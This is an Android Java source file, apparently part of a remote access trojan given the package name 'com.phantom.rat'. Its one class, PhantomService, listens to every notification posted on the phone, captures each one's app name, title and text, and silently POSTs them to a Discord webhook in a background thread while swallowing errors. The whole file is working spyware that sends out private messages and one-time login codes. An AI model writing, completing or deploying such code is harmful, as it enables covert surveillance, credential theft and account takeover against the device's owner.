package com.phantom.rat;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class PhantomService extends NotificationListenerService {
    String webhook = "https://discord.com/api/webhooks/??_??????_?????_???"; 

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);
        String text = sbn.getNotification().extras.getString(Notification.EXTRA_TEXT);
        if(text != null && !webhook.isEmpty()) {
            sendToDiscord(webhook, "App: " + sbn.getPackageName() + "\nTitle: " + title + "\nText: " + text);
        }
    }

    private void sendToDiscord(String urlStr, String msg) {
        new Thread(() -> {
            try {
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                String json = "{\"content\": \"" + msg.replace("\"", "'").replace("\n", "\\n") + "\"}";
                OutputStream os = conn.getOutputStream();
                os.write(json.getBytes("UTF-8"));
                os.close();
                conn.getResponseCode();
            } catch (Exception e) {}
        }).start();
    }
}
